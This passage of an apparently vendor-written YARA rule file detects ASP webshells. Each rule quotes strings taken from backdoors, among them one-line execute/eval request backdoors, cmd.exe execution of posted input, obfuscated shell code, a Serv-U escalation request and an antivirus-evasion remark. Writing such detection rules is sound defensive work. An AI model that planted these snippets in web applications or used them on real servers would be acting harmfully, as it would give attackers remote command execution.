        $s20 = "J@#@&idd,~P\"2?h6H?ARqI(K3~r@!(1hiK,1)\\A'n6]:PP5h3{K3oK,qf{?A].AI~.zSi3{F F !c!R8@*E@#@&Pid~P~~,P~P,~P\"2jK}1?3 qI(KA~rP~Upd" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4396d18ce40744025fec91ae4daa5066a9573c82
{
     meta:
        description = "asp - file 4396d18ce40744025fec91ae4daa5066a9573c82.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
     strings:
        $s1 = "Response.Write \"<textarea name='Paths' cols='80' rows='10'>\"&Paths_str&\"</textarea>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule sig_9c8f6202d90935ca1c567eb870ae75bdc52a21c4
{
     meta:
        description = "asp - file 9c8f6202d90935ca1c567eb870ae75bdc52a21c4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s4 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s7 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s8 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s9 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s10 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s11 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s12 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s14 = "> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>\"&mmshell&\"</div></center>\"" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f72252b13d7ded46f0a206f63a1c19a66449f216
{
     meta:
        description = "asp - file f72252b13d7ded46f0a206f63a1c19a66449f216.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "01ef973b413320c7f3e1fa41a3ac7d76be90e2e340aa3149362ef5fbb1426e98"
     strings:
        $s1 = "<%execute(strreverse(\")\"\"xx\"\"(tseuqer lave\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0c250a4a71d38f4dd93e5539db338dac4fd7d656
{
     meta:
        description = "asp - file 0c250a4a71d38f4dd93e5539db338dac4fd7d656.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "035389a43bda1bc0d14a3cb5ab73122808ca58db979cc51b8431e298fee2b491"
     strings:
        $s1 = "<img src=\"http://i141.photobucket.com/albums/r61/22rockets/HeartBeat.gif\">" fullword ascii
        $s2 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s3 = "- F4ckTeam<a href=\"http://team.f4ck.net\"><font color=\"#CCCCCC\">" fullword ascii
        $s4 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s5 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s6 = "if request(\"pass\")=\"F4ck\" then  '" fullword ascii
        $s7 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s8 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule d9919dcf94a70d5180650de8b81669fa1c10c5a2
{
     meta:
        description = "asp - file d9919dcf94a70d5180650de8b81669fa1c10c5a2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "823f4f79f62641195d1ae1fa84655eb5db448ecf83ee67038340d1855c816d79"
     strings:
        $s1 = "SourceNumber = SourceNumber - (llTemp * (MaxValuePerIndex ^ giCount))" fullword ascii
        $s2 = "FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFile\"), \"d:\\\"" fullword ascii
        $s3 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal MinUpperBound, ByVal IndexSeperator)" fullword ascii
        $s4 = "Do While Int(SourceNumber / (MaxValuePerIndex ^ MinUpperBound)) > (MaxValuePerIndex - 1)" fullword ascii
        $s5 = "iables(\"script_name\")%>?CopyFile=<%=File.Name%>&FolderPath=<%=Server.URLPathEncode(FolderPath & \"\\\")%>\">Copy</a>)</td>" fullword ascii
        $s6 = "FSO.CopyFolder Request.QueryString(\"CopyFolder\") & \"*\", \"d:\\\"" fullword ascii
        $s7 = "Response.Write Drive.DriveLetter & \" - \"" fullword ascii
        $s8 = "If Not FileSystem.FileExists(ScriptFolder & \"ext_\" & lsExt & \".gif\") Then" fullword ascii
        $s9 = "llTemp = Int(SourceNumber / (MaxValuePerIndex ^ giCount))" fullword ascii
        $s10 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword ascii
        $s11 = "<table cellpadding=\"1\" cellspacing=\"1\" border=\"0\" width=\"100%\" align=\"center\" style=\"border:1px inset\">" fullword ascii
        $s12 = "Set Folder = FileSystem.GetFolder(FolderPath)" fullword ascii
        $s13 = "ScriptFolder = ParseFolder(Request.ServerVariables(\"PATH_TRANSLATED\")) & \"images\\\"" fullword ascii
        $s14 = "<input class=\"Address\" type=\"text\" name=\"FolderPath\" value=\"<%=FolderPath%>\" style=\"width:100%\" size=\"20\">" fullword ascii
        $s15 = "If lvAttributes(2) = 1 Then lsResult = lsResult & \"System&nbsp;&nbsp;\"" fullword ascii
        $s16 = "<td bgcolor=\"<%=BgColor%>\"><%=SubFolder.DateLastModified%> </td>" fullword ascii
        $s17 = "Set FileSystem = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s18 = "Response.Write Drive.ShareName & \" [share]\"" fullword ascii
        $s19 = "lsResult = lsResult & CStr(llTemp)" fullword ascii
        $s20 = "lvAttributes = Split(ConvertBinary(AttributeValue, 1, 7, \",\"), \",\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule f56f0f07ddad02106a050ff36f6e5eaa02867f52
{
     meta:
        description = "asp - file f56f0f07ddad02106a050ff36f6e5eaa02867f52.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c105a1cb42555f1e2326fc27ccde84142c64bd6d21ff7bdca791e4d37bf62fc8"
     strings:
        $s1 = "`;``}w4jZ559o${``=w4jS559T x59U9C9W:lWXDd Cxv;}wg4x5N${=wg 4x57;}xa4NjVUw${=xa4NjV 9C9W ;k.m.lWXDd.Cxv.CQj5j4aA8=4xwA1j4T`=ARf" fullword ascii
        $s2 = "4jfja;wxGAQ:CNjM9f-xfU9C;k:YA049R;k:4xw4jU{MwjU>'55a/CGxC'=xoMC xfMC5<>xfCAC/< `&AGY&` - `&14z&`>xfCAC<`=1b4" fullword ascii
        $s3 = "Ch1=xC9WMQgwj8.))`\\`,1Nh(1q9(xR9yx549T.))x5f9K,`\\`,1Nh(S4M(xa9oVxR9y.zoQ YxbC )Ch1(xC9W5g wYP ``><Ch1 QA" fullword ascii
        $s4 = "CYxRYj4A1YX.ffx`&`b`&`5V`&`Z[`(U,``,`Uj0`(aCj&` `=jNU YxbC k>CYNja.CYxRYj4A1YX.ahN QA" fullword ascii
        $s5 = "`4xURNyC4jT\\oaC\\5w2\\wSow4\\5wZ\\4x14xV f9Y`&4of&`AR4x2\\fj4CYjH\\CxVfj4CYj`&0q4&`HCYx44NH\\8X2VnV\\XygrHP8_DPHdD_nXIr`=1Ch" fullword ascii
        $s6 = "`>';%kke:Cb0Axb;jCN9:M-SjfQ4x1j'=xfMC5 1Aw<>'`&)k(fa&`:4jfja-wYNj40za9U;k:4xw4jU'=xfMC5 '4xCYxa'=Y0Af9 'GokkE'=bCwAS wC<`q" fullword ascii
        $s7 = "`(hbj&`>';Go6:ojC-YA049R'=xfMC5 Af<`&`>9x49CGxC/<`&G5o&`>';GokJB:bCwAS'=xfMC5 t=5Sj4 fRba=wA fRba=xR9Y 9x49CGxC<`,``jzM:`:" fullword ascii
        $s8 = ")`4xCxR949T\\54xCxR949T\\4x14xV\\k.E1\\YAR`&hxA&`w9p\\8X2VnV\\XygrHP8_DPHdD_nXIr`(WPXpuXp.ahN=SUY" fullword ascii
        $s9 = "QD4HU1&`=MxIdL2 `&QD4HU1&`k=xfU9YXd`&qoS&`L2-`&QD4HU1&`k|e|e-|`&ACf&`|k.k.k.k|`&Roa&`=YA9RjW-`&QD4HU1&`yg`&qCh&`P8dWCxV-`=w55" fullword ascii
        $s10 = "`>Y9o5/<` & )))o(54,)k6,)o(54(CQxD,k6 > ))o(54(YxD(Qgg(qwY & `>';Go6:CQxf-0YAww9o;Go6Ee:bCwAS'=xfMC5 Y9oVGAQ=559fa Y9o5<`,``jzM" fullword ascii
        $s11 = "_&QD4HU1&RMh&`=w4jS559T-`&QD4HU1&NoR&`=4x57-`&QD4HU1&ACf&`=jyC4jT-`&QD4HU1&`k.k.k.k=Tg-`&QD4HU1&`T7Cx`&xQ5&`VpXV7CxV-`=chG" fullword ascii
        $s12 = ">';)(x5jfa.SjwYAS:CoA4a5919q'=zaAfaYj #=Qx4b 9<>4U<>4U<>xR94QA/<>'kks'=Cb0Axb 'kkm'=bCwAS ''=a45 'j'=xR9Y xR94QA<`,`a`jzM" fullword ascii
        $s13 = "Yxb2)ExR9yUwR=)xR9y.QQY(x59aD 4d 4qc=)xR9y.QQY(x59aD 4d )`$)`&fCx&`(^`,)`.`,xR9Y.QQY(1q9(0fa(Cjy Qg" fullword ascii
        $s14 = ")`uygp2V_npX73`(N5G&`?`&czU&`/`&)x5f9K,`/`,)`dKyg_r2PT`(N5G(S4M&)`2pdT_pXFpXV`(N5G&`:`&)`X8Py_pXFpXV`(N5G&`//:oCCb`=xQ9" fullword ascii
        $s15 = "_&QD4HU1&`e=5bC9T`&jN4&`fxp-`&QD4HU1&`k=xfU95AW-`&QD4HU1&`=xf`&CUM&`AK5x8YA0jD-`&QD4HU1&`\\\\`&)(jfR&`=4AWxRjr-`" fullword ascii
        $s16 = "`xR9y4xCNoRjH\\xR9y4xCNoRjH\\xR9y4xCNoRjH\\fj4CYjH\\CxVfj4CYj`&0q4&`HCYx44NH\\8X2VnV\\8D`&NoY&`Ir`=a4R Yxb2``=a4R Qg" fullword ascii
        $s17 = ")6 - )fh5(YxD,fh5(CQxD=fh5 Yxb2 ` wYP `=)6,fh5(Cb0Ap Qg" fullword ascii
        $s18 = ")m - )fh5(YxD,fh5(CQxD=fh5 Yxb2 ` 4d `=)m,fh5(Cb0Ap Qg" fullword ascii
        $s19 = "``&4U&`\\5xfAK R940j4T\\:G`&4U&`\\50YACCxV wY9 5CYxRNajW\\:G`&4U&`\\5SjwYAS\\:G`&4U&`AYA.CjjU\\:G`=G5o YxbC ``=G5o QA" fullword ascii
        $s20 = "Q9a&YjA54xFwfANlxYA0YXCoA4aV &`.`&YjA54xF4jYA8xYA0YXCoA4aV&`.`& YjA54xF4jq98xYA0YXCoA4aV &`/` & xYA0YXCoA4aV,``jzM" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule dfdb753e0df6683c03e3be07098e4042c5dec02e
{
     meta:
        description = "asp - file dfdb753e0df6683c03e3be07098e4042c5dec02e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ef3241f0ed93797881487fbc4e4da359687f896ef526980a1425fcd51d8519cc"
     strings:
        $s1 = "(htappam.revres(eliFeteleD.osf:)OSF_TSNOC(tcejbOetaerC.revreS=osf tes:)(ledjpa noitcnuf\")):ExeCuTe(TAWp(\"ssalC dnE" fullword ascii
        $s2 = "ageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():ExeCuTe(TAWp(\"tlusERrts &" fullword ascii
        $s3 = "J)(kcehCegaP buS\")):Select Case Action:case \"MainMenu\":MainMenu():Case \"EditPower\":Call EditPower(request(\"PowerPath\")):C" ascii
        $s4 = ":46 - eulaVtni = eulaVtni:nehT 46 => eulaVtni fI:fI dnE:821 - eulaVtni = eulaVtni:nehT 821 => eulaVtni fI:1=KOtidE:KOtidE miD" fullword ascii
        $s5 = "= 2b ;)61 / ]2[bgr(roolf.htaM = 1b ;61*1g - ]1[bgr = 2g ;)61 / ]1[bgr(roolf.htaM = 1g ;61*1r - ]0[bgr = 2r ;)61 / ]0[bgr(roolf." fullword ascii
        $s6 = "nruter ;]2b[srolocxeh + ]1b[srolocxeh = b ;]2g[srolocxeh + ]1g[srolocxeh = g ;]2r[srolocxeh + ]1r[srolocxeh = r ;61*1b - ]2[bgr" fullword ascii
        $s7 = "J)htaPs(eliFmorFdaoLmaertS noitcnuF\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s8 = "Jtiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD\")):case\"MMD\":MMD():case\"R" ascii
        $s9 = "J)(mroFevirDnacSmotsuC buS\")):ExeCuTe(TAWp(\"noitcnuF dne" fullword ascii
        $s10 = "J)(llehs1dmc noitcnuf\")):ExeCuTe(TAWp(\"noitcnuF dnE:fI dnE" fullword ascii
        $s11 = "J)galf,gsm,etats(egasseM buS\")):ExeCuTe(TAWp(\"noitcnuF dne" fullword ascii
        $s12 = "J)mun(eziSehTteG noitcnuF\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s13 = "ysjb=true:Server.ScriptTimeout=999999999:BodyColor=\"#000000\":FontColor=\"#00FF00\":LinkColor=\"#ffffff\":Response.Buffer =true" ascii
        $s14 = "J)(xdmC noitcnuf\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s15 = "J)(nimdar noitcnuF\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s16 = "J)S(edocnELMTH noitcnuF\")):ExeCuTe(TAWp(\"buS dnE" fullword ascii
        $s17 = "J)(flesymorp bus\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s18 = "J)(eliFpU noitcnuF\")):ExeCuTe(TAWp(\"noitcnuF dne" fullword ascii
        $s19 = "J)(ofnIlanimreTteg bus\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
        $s20 = "Jllehsneddih bus\")):ExeCuTe(TAWp(\"noitcnuF dnE" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule ffe0bdd8b9d8a24e55c3286816c5659aab56e707
{
     meta:
        description = "asp - file ffe0bdd8b9d8a24e55c3286816c5659aab56e707.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6d1c851724b5cba44c69df3b31776027c99ae984246885e901313257be4c4430"
     strings:
        $s1 = "<%if request (\"M\")<>\"\"then session(\"M\")=request(\"M\"):end if:if session(\"M\")<>\"\" then execute session(\"M\")%>" fullword ascii
        $s2 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
        $s3 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
        $s4 = "<%execute(unescape(\"eval%20request%28%222016%22%29\"))%>" fullword ascii
        $s5 = "execute(unescape(temp))" fullword ascii
        $s6 = "pass:base , bypass to 360 D safedog , not thx . goodnight" fullword ascii
        $s7 = "execute(play)" fullword ascii
        $s8 = "/*--------------------------------------------------------------------------------*/ " fullword ascii
        $s9 = "a=\"eva@@l%20req@@uest%28%22helloxj%22%29\"" fullword ascii
        $s10 = "<!-- yes++ -->" fullword ascii
        $s11 = "r,\"%\"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function%>" fullword ascii
        $s12 = "temp=temp+c(i)" fullword ascii
        $s13 = "dim a,b,temp,c" fullword ascii
        $s14 = "<%eval\"\"&(\"eval(request(120-2-5))\")%> " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_520caf24f9d208f62e1bb0299125e18c11ef050b
{
     meta:
        description = "asp - file 520caf24f9d208f62e1bb0299125e18c11ef050b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ecfae35a466824ef20ce362730b4f76e75a0f14899a4d88f7dd9d988bbc0ae18"
     strings:
        $s1 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>\">" fullword ascii
        $s2 = "@hotmail.com\" style=\"text-decoration: none\"><font color=\"#858585\">@GrayHatz ~ TurkGuvenligi." fullword ascii
        $s3 = "<a href=\"www.kacaq.blogspot.com\" style=\"text-decoration: none\">" fullword ascii
        $s4 = "<form method=\"POST\" action=\"?kaydet=<%=request.querystring(\"duzenle\")%>&klas=<%=aktifklas%>\" name=\"kaypos\">" fullword ascii
        $s5 = "<a href=\"mailto:BuqX@hotmail.com\" style=\"text-decoration: none\">" fullword ascii
        $s6 = "<form method=\"POST\" action=\"?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>\" name=\"klaspos\">" fullword ascii
        $s7 = "<font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=dongu.driveletter%>:\\ ( <%=dongu.filesystem%> )</font></td>" fullword ascii
        $s8 = "<title>Kacak FSO 1.0 | Terrorist Crew - Saldiri.Org</title>" fullword ascii
        $s9 = "<img border=\"0\" src=\"http://turkguvenligi.info/blues/statusicon/forum_new.gif\"></td>" fullword ascii
        $s10 = "<img border=\"0\" src=\"http://img509.imageshack.us/img509/2842/spartaqt5.jpg\"></td>" fullword ascii
        $s11 = "<SCRIPT SRC=http://www.saldiri.org/summer/ciz.js></SCRIPT>" fullword ascii
        $s12 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></" fullword ascii
        $s13 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td" fullword ascii
        $s14 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td>" fullword ascii
        $s15 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></td>" fullword ascii
        $s16 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
        $s17 = "<a href=\"?yenidosya=<%=aktifklas%>\" style=\"text-decoration: none\"><font color=\"#9F9F9F\">Yeni Dosya</font></a> </font></t" fullword ascii
        $s18 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
        $s19 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
        $s20 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1478047b3946472bf7780179357f80e593a1e3d0
{
     meta:
        description = "asp - file 1478047b3946472bf7780179357f80e593a1e3d0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e1a4e0792202cac0fe59cd510881a56cb9c221bd76c347ae5b995cbd14965e96"
     strings:
        $s1 = "<%execute request(\"sb\")'<% loop <%:%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_25e7dd4c7edbe53dd053ef0cd796ce020f551a76
{
     meta:
        description = "asp - file 25e7dd4c7edbe53dd053ef0cd796ce020f551a76.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5c28e493efd2b65ac03c111f6369330146410a1c0e151fc7be3c1f18805f0915"
     strings:
        $s1 = "D/@#@&P,?+D~G4Ns6'G4%o9Rok^n/@#@&~~9k:~dDDoNgCs+@#@&P,rx,2M.WMP]+kEhn,1+XO@#@&PPwG.PAl1t~rUnGk.P&UPK4%ok@#@&~~,PdYMo91Cs+{rx" fullword ascii
        $s2 = "arzamO@*E/.nDVkwzYbDE1nj+^4mx3-2ramP-knmb\\.nU- TTD+jVK.DxG;-t2KU5Uw2gquZzHmJzZrdm5A|CExnE^l7PUWrOaW@!" fullword ascii
        $s3 = "#@~^xXIBAA==/KxdDPG209'rE@#@&/;4,?4GS2DMc#@#@&P,(WPADMPPtnU@#@&%J@!8D@*@!C~4D+WxELC\\md1DraY=tkkYK.Xc4Cm0`bv@*@!4M@*PrP[,3.Dcf" fullword ascii
        $s4 = "htp=\"http://odayexp.com/h4cker/sqlss/\"'" fullword ascii
        $s5 = "JW,[PER\"lOkKd;Dn9kD'!rPL~\\(Z.S6P'~rOp!GYmZEM.nxD'ZJ~[~-(Z.S6~[,JR}!WYC\\m6r:!h{!E,[,\\4;DdWPLPm@#@&P~~,PP,~J HlbUO+" fullword ascii
        $s6 = "OPK4%o6'1GO4kUo@#@&,2U9PwEx1YbGx@#@&~nMk-CD+Pw;x1YkKU~ZM+mYnnCOD+.xvV+HhG.9#P~~@#@&~P,/M+CD+hlYD+MU'0+zhKD[@#@&PP,/D" fullword ascii
        $s7 = "@#@&,P,~KHwnSb/O~{PPr lkwRmdCR(lDR8:2 1WhR9GmcN8 9VV nX+ obWctOsR4Y:^RbUmckUkcL2LcL/csWTR:98 :bNc:2& 2" fullword ascii
        $s8 = "VkwqhKt?{UGkDmzgv'^.kPv+sCDw+srwB'nhmx~+sCM0r@!@*9Y@!@*By* W *a=NU;KDo0^l(B'" fullword ascii
        $s9 = "B@*fnV@!&m@*~@!m~tM+WxELl-Ckm.kaO=s;^VwWDs`rEJLInnmY4chlY4'J'J[d Hls+*[EJESrJ/WazsbVnEr#B~^^ld/{vm:v,YbYV" fullword ascii
        $s10 = "`JoG^NnDhCDtE*[r-/4+^sRm/2J=KaO{/YM$bG@#@&AU[P&0@#@&%PE@!wW.:,CmDkGU{BJ'i\"S'JQ)1YrKxy'nK/DvPs+OtKNxvaW/DvP" fullword ascii
        $s11 = "'VmbV^UKPl@!@*BXw =LUk9Nmwv'nsHYdP8xtDNrA,NY@!@*9Y&@!@*vZ!TZ!Za)9x!GDT3^l(Bxn^XYk~F{tY9rAP9Y@!@*[Y&@!@*+hlMWkJ@!@*vZB'.n9DG4" fullword ascii
        $s12 = "v@*}wnx@!zC@*,J@#@&dk{/kLE@!l,tM+W'v%m\\C/1.kaYlo!VVoGM:cJrELInhlDt`hlD4[r-E[dRHCs+#LEJr~Jr3[kDsbVnJEbEP^Vmd/{BChEPYrO^+xB" fullword ascii
        $s13 = "Dxj5Srd3f~RFpKC/khKD['E'ald/SGD9[EI`/+.~&fxJLr9)dDD5E+MX,xPr+a+1PhCkY+M N(WRX2mmtNkCnSs~EJ~[,.+$EndDR0G.s`EHt9r#~LPrBJ=/" fullword ascii
        $s14 = "x~@#@&~NPxP8*P@#@&3U9PqW~@#@&(0,\\bNckYMkxBPbSP8#~',J[E,rD,\\k9`/D.rxBPb~~Fb~{PEfr~K4+U~@#@&P%~{Pq&,@#@&2U9P&0P@#@&&WPtk[`kY.r" fullword ascii
        $s15 = "O~VKmmVLDG;aPCNsrxb/O.mYW.d,l[:bUfP&mN9BPkk.n'E*TB@*@!&O9@*J@#@&LrP@!JO.@*r@#@&LEP@!OMPCVbLx{B^n" fullword ascii
        $s16 = "WYv0S+*@#@&nU9Pr0@#@&6Y2aWMYP{P+X*Z!@#@&DkhnKEY{f@#@&VWTrUEk+MPxPEik+.Pr~[,EdnMP[~-(Z.S6@#@&VGTk" fullword ascii
        $s17 = "/DcJUjCmDkGUr#@#@&r0,PxKO~kkx!:nDr^v?il1OkKxb~Dt+U~M+dwKUk+ " fullword ascii
        $s18 = "?DlDDP{9qAx[@#@&KoJcsk^n?by+,x~fUYmDOPR9&2UN,R&@#@&rW,xWO~G  2XrkYdvja1ls+*~Y4+U@#@&P~9yRl9[P`w1mhn~:sd@#@&+U[,kW@#@&~P" fullword ascii
        $s19 = "[sswoosEPmVroUx^+WY@*E[}4Pcb~ b'r@!&Y9@*@!zOM@*r@#@&g+XO@#@&L~?&@#@&3MDR;s+mD@#@&@#@&0!x1YrWU~T+OC:PnhlLnvEDsb,@#@&W" fullword ascii
        $s20 = "N;WsW.xEaq 8+FyBEE@*J@#@&db'dkLobVn&mK`Sc1mh+*@#@&/b'drLJ@!m~tM+0{v%l7lkm.k2O=s;V^oWM:cErJ[]nhlOtvKmY4LJ'J[dRgC:" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule cb18e1ac11e37e236e244b96c2af2d313feda696
{
     meta:
        description = "asp - file cb18e1ac11e37e236e244b96c2af2d313feda696.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8a991ee9a45f1ef1d9f4f73e81de65b085eef70a57a074eb5416f7b768f1f3ef"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $s2 = "' -- Read the output from our command and remove the temp file -- '" fullword ascii
        $s3 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "' -- check for a command that we have posted -- '" fullword ascii
        $s6 = "' -- Use a poor man's pipe ... a temp file -- '" fullword ascii
        $s7 = "' Author: Maceo <maceo @ dogmile.com>" fullword ascii
        $s8 = "' -- create the COM objects that we will be using -- '" fullword ascii
        $s9 = "<-- CmdAsp.asp -->" fullword ascii
        $s10 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s11 = "Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
        $s12 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s13 = "<++ CmdAsp.asp ++>" fullword ascii
        $s14 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s15 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s16 = "szCMD = Request.Form(\".CMD\")" fullword ascii
        $s17 = "Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
        $s18 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
